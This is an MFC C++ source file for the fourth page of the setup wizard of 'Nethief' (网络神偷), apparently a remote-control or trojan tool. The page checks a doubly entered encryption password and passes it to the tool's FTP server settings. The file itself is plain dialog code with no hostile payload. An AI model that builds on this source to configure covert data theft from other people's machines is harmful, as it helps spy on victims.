// WizardPage4.cpp : implementation file
// Download by http://www.NewXing.com

#include "stdafx.h"
#include "Nethief.h"
#include "WizardPage4.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CWizardPage4 property page

IMPLEMENT_DYNCREATE(CWizardPage4, CPropertyPage)

CWizardPage4::CWizardPage4() : CPropertyPage(CWizardPage4::IDD)
{
	//{{AFX_DATA_INIT(CWizardPage4)
	m_strPassword = _T("");
	m_strPassword2 = _T("");
	//}}AFX_DATA_INIT
}

CWizardPage4::~CWizardPage4()
{
}

void CWizardPage4::DoDataExchange(CDataExchange* pDX)
{
	CPropertyPage::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CWizardPage4)
	DDX_Text(pDX, IDC_EDIT_PASSWORD, m_strPassword);
	DDX_Text(pDX, IDC_EDIT_PASSWORD2, m_strPassword2);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CWizardPage4, CPropertyPage)
	//{{AFX_MSG_MAP(CWizardPage4)
		// NOTE: the ClassWizard will add message map macros here
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CWizardPage4 message handlers

BOOL CWizardPage4::OnQueryCancel() 
{
	// TODO: Add your specialized code here and/or call the base class
	if(MessageBox("网络神偷设置向导未完成设置过程。\r\n\r\n是否想退出本向导？",
		"网络神偷 设置向导",MB_ICONQUESTION|MB_YESNO)==IDNO)
		return FALSE;
	
	return CPropertyPage::OnQueryCancel();
}

LRESULT CWizardPage4::OnWizardNext() 
{
	// TODO: Add your specialized code here and/or call the base class
	UpdateData(TRUE);

	CString strText="";
	if(m_strPassword!=m_strPassword2)
		strText="两次输入的密码不相同。";
	if(m_strPassword=="")
		strText="请填写“数据加密密码”。";
	if(m_strPassword2=="")
		strText="请填写“再次确认”。";
	if(strText!="")
	{
		MessageBox(strText,"网络神偷 设置向导",MB_ICONWARNING|MB_OK);
		return -1;
	}
	m_strPassword.TrimLeft();
	m_strPassword.TrimRight();

	CCommunity* pCommunity=((CNethiefApp*)AfxGetApp())->pCommunity;
	pCommunity->SetFtpServerInfo(3,
		"","","","",
		"","","","",
		"",
		m_strPassword);

	return CPropertyPage::OnWizardNext();
}
